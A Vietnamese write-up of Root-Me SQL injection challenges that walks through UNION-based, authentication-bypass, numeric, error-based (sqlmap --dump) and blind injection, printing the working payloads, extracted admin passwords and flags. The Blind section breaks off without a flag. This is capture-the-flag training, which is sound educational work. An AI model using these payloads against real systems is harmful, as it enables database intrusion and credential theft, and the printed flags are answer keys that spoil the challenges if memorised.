
# SQL injection - String
CMS v 0.0.2

http://challenge01.root-me.org/web-serveur/ch19/

**Statement**: Retrieve the administrator password

## Cách làm
### Tìm chức năng dính lỗi SQLi
Sau khi truy cập vào link, ta thấy có các chức năng như trang chủ, đăng nhập, tìm kiếm

![image](https://github.com/aQ05/Write-up/assets/121664384/cf62bf7a-4325-4994-b71b-156e05f23b2f)

Để biết lỗi SQLi xảy ra ở chức năng nào thì ta chỉ cần nhập ký tự `1'` và lỗi SQLi xuất hiện tại ô tìm kiếm

![image](https://github.com/aQ05/Write-up/assets/121664384/85d78798-2c99-4f34-8e7a-e058ec73c2c8)

CSDL được sử dụng ở đây là SQLite3 nên ta sẽ khai thác trên SQLite3.
### Tìm số cột
Đầu tiên sử dụng lệnh `ORDER BY` để kiểm tra số cột cho phép.

Nhập lệnh `1’ order by 1--` và đến `1' order by 3--` thì bị lỗi.

![image](https://github.com/aQ05/Write-up/assets/121664384/37d2dd10-8e0d-48cd-b20b-4f44b58d6530)

Tức là CSDL này có 2 cột. Dùng lệnh `UNION SELCT` để khai thác dữ liệu.
### Exploit
Với SQLite3 (https://www.sqlite.org/faq.html), ta sẽ `SELECT` đến `SQLITE_SCHEMA`

![image](https://github.com/aQ05/Write-up/assets/121664384/7c379380-5410-4360-a210-8ae1eacafb85)

Gõ lệnh `1' union select name,sql from sqlite_master--`, ta sẽ biết được CSDL này có 2 bảng là `news` và `users` với lần lượt là tên cột, kiểu dữ liệu.

![image](https://github.com/aQ05/Write-up/assets/121664384/df32cc27-1c25-403a-9444-fa297dadad2f)

`news (CREATE TABLE news(id INTEGER, title TEXT, description TEXT))`

`users (CREATE TABLE users(username TEXT, password TEXT, Year INTEGER))`

Đề bài yêu cầu tìm password admin nên ta cần truy xuất dữ liệu từ bảng `users`. Thực thi câu lệnh  `1' union select username, password from users --`, ta sẽ tìm được password của admin: `admin (c4K04dtIaJsuWdi)`

![image](https://github.com/aQ05/Write-up/assets/121664384/c1ae054f-3d4b-4b73-ad7c-8784c82412cd)

Và đăng nhập thành công
![image](https://github.com/aQ05/Write-up/assets/121664384/fd7edfcd-7f0e-47d7-9a70-4b19e9e56cd0)

## Flag
`c4K04dtIaJsuWdi`

# SQL injection - Authentication
Authentication v 0.01

**Statement:** Retrieve the administrator password

## Cách làm
Truy cập link http://challenge01.root-me.org/web-serveur/ch9/, ta thấy 1 trang web có chức năng đăng nhập.

Để đăng nhập, nhập `admin'-- ` vào trường `username` với mật khẩu tùy ý.

![image](https://github.com/aQ05/Write-up/assets/121664384/b9d97aa9-71bc-4f07-bbc3-fc8be27c67e9)


Để tìm passwprd, `Ctrl U` để xem source code
![Screenshot 2023-11-05 132759](https://github.com/aQ05/Write-up/assets/121664384/3d6556f8-c513-46af-a414-7babe327713b)


## Flag
`t0_W34k!$`

# SQL injection - Numeric
CMS v 0.0.1

**Statement:** Retrieve the administrator password.
## Cách làm
Truy cập link http://challenge01.root-me.org/web-serveur/ch18/ 

![image](https://github.com/aQ05/Write-up/assets/121664384/969b2c02-4a25-4fc4-99ec-8c052788be0f)

Thêm ký tự `'` vào cuối url để tìm lỗi. Trang `Système de news` xuất hiện lỗi và ta sẽ khai thác trực tiếp trên url.

![image](https://github.com/aQ05/Write-up/assets/121664384/32929941-ecae-4b37-9598-4406d6a98148)

CSDL được sử dụng ở đây là SQLite3 nên ta sẽ khai thác trên SQLite3.
### Tìm số cột
Đầu tiên sử dụng lệnh `ORDER BY` để kiểm tra số cột cho phép.

Nhập lệnh ` order by 1--` vào cuối url và đến ` order by 4--` thì bị lỗi.

![image](https://github.com/aQ05/Write-up/assets/121664384/09be6067-6a96-4e3e-bd13-daf75ef9acf5)

Tức là CSDL này có 3 cột. Dùng lệnh `UNION SELCT` để khai thác dữ liệu.
### Exploit
Nhập lệnh ` union select 1,2,3--` 

![image](https://github.com/aQ05/Write-up/assets/121664384/6ffaccf9-ac92-4545-9926-affc9108ec7e)

Như vậy ta có thể khai thác tại cột thứ 2 và 3. Lấy tên bảng bằng cách dùng câu lệnh ` union select 1,2,sql from sqlite_master--`, ta thu được 2 bảng:

![image](https://github.com/aQ05/Write-up/assets/121664384/2af7f0ba-1ec4-4e75-9da1-4fa9efc7ca5d)

Đề bài yêu cầu tìm password admin nên ta cần truy xuất dữ liệu từ bảng `users`. Thực thi câu lệnh  ` union select 1,username, password from users --`, ta sẽ tìm được password của admin: `aTlkJYLjcbLmue3`.

![Screenshot 2023-11-05 144912](https://github.com/aQ05/Write-up/assets/121664384/e795ce1e-224c-43f5-bbdb-c4f59d1de201)


## Flag
`aTlkJYLjcbLmue3`




# SQL injection - Error
Exploiting SQL error

**Statement:** Retrieve administrator’s password.

## Cách làm
Truy cập link http://challenge01.root-me.org/web-serveur/ch34/ thấy có xuất hiện 2 page `Authentication` và `Contents`. 

![image](https://github.com/aQ05/Write-up/assets/121664384/94565777-0f2c-482d-9605-e62b350cdd4a)

Truy cập vào từng trang và nhập `'` ở cuối url thì trang `Contents` xuất hiện lỗi

![image](https://github.com/aQ05/Write-up/assets/121664384/461a61c0-68eb-4b0f-8c74-3b78b78d2e8d)

Sử dụng sqlmap khai thác với url ta sử dụng `-u`. Gõ lệnh `sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" --dbs` (`-dbs` là để lấy dữ liệu database).

![Screenshot 2023-11-05 204442](https://github.com/aQ05/Write-up/assets/121664384/9997414a-9c0c-482a-9b7d-391390dd453e)

Có 3 database trả về, tuy nhiên ta chỉ cần chú ý đến database `public` và thực hiện lấy các tables trên db này.
Gõ lệnh: `sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public --tables`

(`-D public` là để lấy kết quả trong database public).

![Screenshot 2023-11-05 204559](https://github.com/aQ05/Write-up/assets/121664384/b1aa43ab-37e9-4fe4-9c57-728854912f59)

Ta có 1 bảng là `m3mbr35t4bl3`. Thực hiện lấy data trong bảng. Gõ lệnh: `sqlmap.py -u "http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=ASC" -D public -T m3mbr35t4bl3 --dump`
(`T` là bảng cần lấy dữ liệu, `--dump` để lấy toàn bộ dữ liệu).

![Screenshot 2023-11-05 204707](https://github.com/aQ05/Write-up/assets/121664384/6f2714ff-2dca-4b0a-bd3f-f4fd33b7d4f8)

## Flag
`1a2BdKT5DIx3qxQN3UaC`

# SQL injection - Blind
Authentication v 0.02

**Statement:** Retrieve the administrator password.

## Cách làm
Truy cập link http://challenge01.root-me.org/web-serveur/ch10/. Giao diện hiện ra chức năng đăng nhập. Thử payload với username `admin’-- ` và password tùy ý. Tuy nhiên website không trả về bất kỳ thông tin về password nào cả.

![image](https://github.com/aQ05/Write-up/assets/121664384/40b751f2-59f2-4cd7-8793-daba5f376695)

Mở burpsuite thử thay đổi payload bằng cách sử dụng `union select`. Dùng lệnh `username=admin%27+union+select+password+from+users+where+username='admin'--+-&password=1` và trang web phản hồi lại có dòng chữ `Injection detected !` 

![Screenshot 2023-11-07 130854](https://github.com/aQ05/Write-up/assets/121664384/899591bb-e45b-4b48-8506-312b18da0309)



## Flag



